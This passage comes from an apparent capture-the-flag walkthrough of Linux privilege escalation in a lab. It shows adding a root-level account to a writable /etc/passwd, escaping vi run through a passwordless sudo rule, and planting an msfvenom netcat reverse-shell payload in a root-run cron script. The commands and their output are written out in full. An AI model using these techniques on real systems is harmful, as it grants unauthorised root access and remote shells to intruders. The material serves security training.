style="color:#F8F8F2"><span class="token plain">user7@polobox:~$ openssl passwd -1 -salt new 123</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$1$new$p7ptkEKU1HnaHpRtzNizS1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>openssl passwd -1 -salt new 123</code></p><ol start="4"><li>Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username &quot;new&quot; and the password hash we created before?</li></ol><p><code>new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</code></p><ol start="5"><li>Great! Now you&#x27;ve got everything you need. Just add that entry to the end of the /etc/passwd file!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7@polobox:~$ openssl passwd -1 -salt new 123</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$1$new$p7ptkEKU1HnaHpRtzNizS1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7@polobox:~$ nano /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7@polobox:~$ cat /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:x:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">syslog:x:104:108::/home/syslog:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">_apt:x:105:65534::/nonexistent:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uuidd:x:107:111::/run/uuidd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lightdm:x:108:117:Light Display Manager:/var/lib/lightdm:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ntp:x:109:119::/home/ntp:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">avahi:x:110:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">colord:x:111:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nm-openconnect:x:114:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nm-openvpn:x:115:125:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pulse:x:116:126:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rtkit:x:117:128:RealtimeKit,,,:/proc:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">saned:x:118:129::/var/lib/saned:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">geoclue:x:103:105::/var/lib/geoclue:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vboxadd:x:999:1::/var/run/vboxadd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user1:x:1000:1000:user1,,,:/home/user1:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user2:x:1001:1001:user2,,,:/home/user2:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3:x:1002:1002:user3,,,:/home/user3:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4:x:1003:1003:user4,,,:/home/user4:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5:x:1004:1004:user5,,,:/home/user5:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user6:x:1005:1005:user6,,,:/home/user6:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7:x:1006:0:user7,,,:/home/user7:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8:x:1007:1007:user8,,,:/home/user8:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:x:122:65534::/run/sshd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="6"><li>Now, use &quot;su&quot; to login as the &quot;new&quot; account, and then enter the password. If you&#x27;ve done everything correctly- you should be greeted by a root prompt! Congratulations!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7@polobox:~$ su - new</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">You are running in superuser mode, be very careful.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 13:51:11</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 335/1991MB (16.83%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@polobox:~#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-7-escaping-vi-editor">Task 7 Escaping Vi Editor<a href="#task-7-escaping-vi-editor" class="hash-link" aria-label="Direct link to Task 7 Escaping Vi Editor" title="Direct link to Task 7 Escaping Vi Editor"></a></h2><p><strong>Sudo -l</strong></p><p>This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use &quot;<code>sudo -l</code>&quot; to list what commands you&#x27;re able to use as a super user on that account. Sometimes, like this, you&#x27;ll find that you&#x27;re able to run certain commands as a root user without the root password. This can enable you to escalate privileges.</p><p><strong>Escaping Vi</strong></p><p>Running this command on the &quot;user8&quot; account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!</p><p><strong>Misconfigured Binaries and GTFOBins</strong></p><p>If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.</p><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/</a></p><ol><li>First, let&#x27;s exit out of root from our previous task by typing &quot;<strong>exit</strong>&quot;. Then use &quot;<strong>su</strong>&quot; to swap to user8, with the password &quot;<strong>password</strong>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ su - user8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 14:14:34</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 334/1991MB (16.78%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8@polobox:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="2"><li>Let&#x27;s use the &quot;<code>sudo -l</code>&quot; command, what does this user require (or not require) to run vi as root?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8@polobox:~$ sudo -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Defaults entries for user8 on polobox:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User user8 may run the following commands on polobox:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/vi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>NOPASSWD</code></p><ol start="3"><li>So, all we need to do is open vi as root, by typing &quot;<code>sudo vi</code>&quot; into the terminal.</li></ol><p><code>No answer needed</code></p><ol start="4"><li>Now, type &quot;:!sh&quot; to open a shell!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8@polobox:~$ sudo vi</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-8-exploiting-crontab">Task 8 Exploiting Crontab<a href="#task-8-exploiting-crontab" class="hash-link" aria-label="Direct link to Task 8 Exploiting Crontab" title="Direct link to Task 8 Exploiting Crontab"></a></h2><p><strong>What is Cron?</strong></p><p>The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.</p><p><strong>How to view what Cronjobs are active.</strong></p><p>We can use the command &quot;cat /etc/crontab&quot; to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn&#x27;t find anything.</p><p><strong>Format of a Cronjob</strong></p><p>Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job.</p><ul><li><code>#</code> = ID</li><li><code>m</code> = Minute</li><li><code>h</code> = Hour</li><li><code>dom</code> = Day of the month</li><li><code>mon</code> = Month</li><li><code>dow</code> = Day of the week</li><li><code>user</code> = What user the command will run as</li><li><code>command</code> = What command should be run</li></ul><p>For Example,</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#  m   h dom mon dow user  command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">17 *   1  *   *   *  root  cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>How can we exploit this?</strong></p><p>We know from our LinEnum scan, that the file autoscript.sh, on user4&#x27;s Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.</p><p><strong>Let&#x27;s do it!</strong></p><ol><li>First, let&#x27;s exit out of root from our previous task by typing &quot;<strong>exit</strong>&quot;. Then use &quot;<strong>su</strong>&quot; to swap to <strong>user4</strong>, with the password &quot;<strong>password</strong>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8@polobox:~$ su - user4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 14:23:33</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 335/1991MB (16.83%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4@polobox:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="2"><li>Now, on our host machine- let&#x27;s create a payload for our cron exploit using msfvenom. </li></ol><p><code>No answer needed</code></p><ol start="3"><li>What is the flag to specify a payload in msfvenom?</li></ol><p><code>-p</code></p><ol start="4"><li>Create a payload using: &quot;<code>msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</code>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Common Linux Privesc$ msfvenom -p cmd/unix/reverse_netcat lhost=10.8.106.222 lport=8888 R</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] No arch selected, selecting arch: cmd from the payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload size: 94 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mkfifo /tmp/mrimb; nc 10.8.106.222 8888 0&lt;/tmp/mrimb | /bin/sh &gt;/tmp/mrimb 2&gt;&amp;1; rm /tmp/mrimb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="5"><li>What directory is the &quot;autoscript.sh&quot; under?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4@polobox:~$ cat /etc/crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># /etc/crontab: system-wide crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># command to install the new version when you edit this file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># and files in /etc/cron.d. These files also have username fields,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># that none of the other crontabs do.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SHELL=/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># m h dom mon dow user  command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*/5  *    * * * root    /home/user4/Desktop/autoscript.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/home/user4/Desktop/</code></p><ol start="6"><li>Lets replace the contents of the file with our payload using: &quot;<code>echo [MSFVENOM OUTPUT] &gt; autoscript.sh</code>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4@polobox:~$ echo &quot;mkfifo /tmp/mrimb; nc 10.8.106.222 8888 0&lt;/tmp/mrimb | /bin/sh &gt;/tmp/mrimb 2&gt;&amp;1; rm /tmp/mrimb&quot; &gt; /home/user4/Desktop/autoscript.sh </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4@polobox:~$ cat /home/user4/Desktop/autoscript.sh </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mkfifo /tmp/mrimb; nc 10.8.106.222 8888 0&lt;/tmp/mrimb | /bin/sh &gt;/tmp/mrimb 2&gt;&amp;1; rm /tmp/mrimb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg 